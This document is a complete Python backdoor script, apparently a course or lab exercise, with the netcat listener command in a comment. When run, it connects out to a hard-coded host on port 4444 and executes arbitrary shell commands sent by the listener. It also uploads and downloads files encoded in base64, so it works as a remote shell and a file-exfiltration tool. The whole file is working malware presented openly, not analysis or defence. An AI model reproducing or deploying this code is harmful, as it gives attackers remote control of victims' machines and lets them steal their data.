#!/usr/bin/env python

# nc -vv -l -p 4444

import socket
import subprocess
import json
import os
import base64
import sys

class Backdoor:
	def __init__(self, ip, port):
		# create socket object
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# connect to our target
		self.connection.connect((ip, port))

	def reliable_send(self, data):
		# convert my data into a json object
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				# receive data
				json_data = json_data + self.connection.recv(1024)
				# unwrap data
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_system_command(self, command):
		# a location for a file stream to redirect the standard error and standard input
		DEVNULL = open(os.devnull, 'wb')
		return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

	def change_working_directory_to(self, path):
		os.chdir(path)
		return "[+] Changing working directory to " + path

	def read_file(self, path):
		# open file, "read binary"
		with open(path, "rb") as file:
			# convert unknown characters to known characters
			# send to listener
			return base64.b64encode(file.read())

	def write_file(self, path, content):
		# open file in the path, reference it as file
		with open(path, "wb") as file:
		# write content passed to it (result from download command)
		# decode before writing to file
			file.write(base64.b64decode(content))
			return "[+] Upload successful."

	def run(self):
		# wait for target to send us data, store in command
		while True:
			command = self.reliable_receive()
			# parse command unless error
			try:
				# EXIT backdoor command
				if command[0] == "exit":
					self.connection.close()
					sys.exit()
				# CD command
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_directory_to(command[1])
				# download "file" command
				elif command[0] == "download":
					command_result = self.read_file(command[1])
				# upload "file" "contents" command
				elif command[0] == "upload":
					command_result = self.write_file(command[1], command[2])
				# all other commands
				else:
					command_result = self.execute_system_command(command)
			except Exception:
				command_result = "[-] Error during command execution."

			# send result to listener
			self.reliable_send(command_result)

my_backdoor = Backdoor("10.0.2.14", 4444)
my_backdoor.run()
